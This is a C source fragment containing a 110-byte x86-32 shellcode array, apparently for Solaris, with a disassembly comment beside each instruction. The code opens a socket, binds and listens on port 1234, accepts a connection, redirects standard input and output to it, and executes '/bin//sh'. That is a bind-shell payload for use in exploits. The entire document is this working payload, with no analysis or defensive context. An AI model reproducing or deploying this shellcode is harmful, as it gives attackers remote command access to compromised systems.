
// Target architecture : X86 32

#define BS_SIZE 110

char BS[] = {
  /* 0000 */ "\xb8\xff\xff\xff\xff" /* mov  eax, 0xffffffff */
  /* 0005 */ "\xba\xfd\xff\xfb\x2d" /* mov  edx, 0x2dfbfffd */
  /* 000A */ "\xf7\xd0"             /* not  eax             */
  /* 000C */ "\xf7\xd2"             /* not  edx             */
  /* 000E */ "\x50"                 /* push eax             */
  /* 000F */ "\x52"                 /* push edx             */
  /* 0010 */ "\x89\xe7"             /* mov  edi, esp        */
  /* 0012 */ "\x31\xdb"             /* xor  ebx, ebx        */
  /* 0014 */ "\xf7\xe3"             /* mul  ebx             */
  /* 0016 */ "\xb0\x02"             /* mov  al, 2           */
  /* 0018 */ "\x50"                 /* push eax             */
  /* 0019 */ "\x52"                 /* push edx             */
  /* 001A */ "\x52"                 /* push edx             */
  /* 001B */ "\x50"                 /* push eax             */
  /* 001C */ "\x50"                 /* push eax             */
  /* 001D */ "\x50"                 /* push eax             */
  /* 001E */ "\xb0\xe6"             /* mov  al, 0xe6        */
  /* 0020 */ "\xcd\x91"             /* int  0x91            */
  /* 0022 */ "\x93"                 /* xchg eax, ebx        */
  /* 0023 */ "\x6a\x10"             /* push 0x10            */
  /* 0025 */ "\x57"                 /* push edi             */
  /* 0026 */ "\x53"                 /* push ebx             */
  /* 0027 */ "\x52"                 /* push edx             */
  /* 0028 */ "\xb0\xe8"             /* mov  al, 0xe8        */
  /* 002A */ "\xcd\x91"             /* int  0x91            */
  /* 002C */ "\x52"                 /* push edx             */
  /* 002D */ "\x53"                 /* push ebx             */
  /* 002E */ "\x52"                 /* push edx             */
  /* 002F */ "\xb0\xe9"             /* mov  al, 0xe9        */
  /* 0031 */ "\xcd\x91"             /* int  0x91            */
  /* 0033 */ "\x52"                 /* push edx             */
  /* 0034 */ "\x53"                 /* push ebx             */
  /* 0035 */ "\x6a\x02"             /* push 2               */
  /* 0037 */ "\xb0\xea"             /* mov  al, 0xea        */
  /* 0039 */ "\xcd\x91"             /* int  0x91            */
  /* 003B */ "\x93"                 /* xchg eax, ebx        */
  /* 003C */ "\x92"                 /* xchg eax, edx        */
  /* 003D */ "\x99"                 /* cdq                  */
  /* 003E */ "\x59"                 /* pop  ecx             */
  /* 003F */ "\x51"                 /* push ecx             */
  /* 0040 */ "\x52"                 /* push edx             */
  /* 0041 */ "\xb0\x06"             /* mov  al, 6           */
  /* 0043 */ "\xcd\x91"             /* int  0x91            */
  /* 0045 */ "\x51"                 /* push ecx             */
  /* 0046 */ "\x6a\x09"             /* push 9               */
  /* 0048 */ "\x53"                 /* push ebx             */
  /* 0049 */ "\x52"                 /* push edx             */
  /* 004A */ "\xb0\x3e"             /* mov  al, 0x3e        */
  /* 004C */ "\xcd\x91"             /* int  0x91            */
  /* 004E */ "\x83\xc4\x18"         /* add  esp, 0x18       */
  /* 0051 */ "\x49"                 /* dec  ecx             */
  /* 0052 */ "\x79\xeb"             /* jns  0x3f            */
  /* 0054 */ "\x52"                 /* push edx             */
  /* 0055 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f      */
  /* 005A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f      */
  /* 005F */ "\x89\xe3"             /* mov  ebx, esp        */
  /* 0061 */ "\x52"                 /* push edx             */
  /* 0062 */ "\x53"                 /* push ebx             */
  /* 0063 */ "\x89\xe1"             /* mov  ecx, esp        */
  /* 0065 */ "\x52"                 /* push edx             */
  /* 0066 */ "\x52"                 /* push edx             */
  /* 0067 */ "\x51"                 /* push ecx             */
  /* 0068 */ "\x53"                 /* push ebx             */
  /* 0069 */ "\x52"                 /* push edx             */
  /* 006A */ "\xb0\x3b"             /* mov  al, 0x3b        */
  /* 006C */ "\xcd\x91"             /* int  0x91            */
};